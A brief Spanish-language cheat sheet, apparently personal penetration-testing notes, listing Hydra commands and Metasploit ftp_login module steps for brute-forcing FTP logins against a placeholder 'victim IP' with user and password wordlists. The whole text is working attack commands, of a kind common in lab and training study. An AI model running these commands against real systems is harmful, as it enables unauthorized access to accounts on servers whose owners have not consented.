# HYDRA
## Conociendo usuario
```bash
hydra -l <"Usuario"> -P <"Diccionario de contraseñas"> ftp://<"IP VICTIMA">
```

## Usuario Desconocido
```bash
hydra -L <"Diccionario de usuarios"> -P <"Diccionario de contraseñas"> ftp://<"IP VICTIMA">
```

# Metasploit

```bash
search ftp_login
```

```bash
use 0
```

```bash
set RHOST <"IP Victima">
```

## Conociendo Usuario

```bash
set USERNAME <"Usuario">
```
## Desconociendo Usuario

```bash
set USERNAME_FILE <"Diccionario de Usuarios">
```


```bash
set PASS_FILE <"Diccionario de Contraseñas">
```

```bash
set VERBOSE false
```

```bash
run
```